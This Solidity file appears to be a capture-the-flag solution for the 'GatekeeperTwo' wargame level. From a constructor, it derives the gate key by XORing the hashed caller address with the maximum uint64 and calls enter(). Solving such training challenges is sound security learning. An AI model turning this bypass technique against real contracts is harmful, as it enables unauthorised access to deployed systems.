// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {GatekeeperTwo} from "./GatekeeperTwo.sol";
import {console} from "forge-std/console.sol";

contract GatekeeperTwoHack {
    GatekeeperTwo gatekeeperTwo;

    constructor(address _gatekeeperTwo) {
        gatekeeperTwo = GatekeeperTwo(_gatekeeperTwo);
        uint64 key = uint64(bytes8(keccak256(abi.encodePacked(address(this))))) ^ type(uint64).max;
        bytes8 gateKey = bytes8(key);
        gatekeeperTwo.enter(gateKey);
    }
}
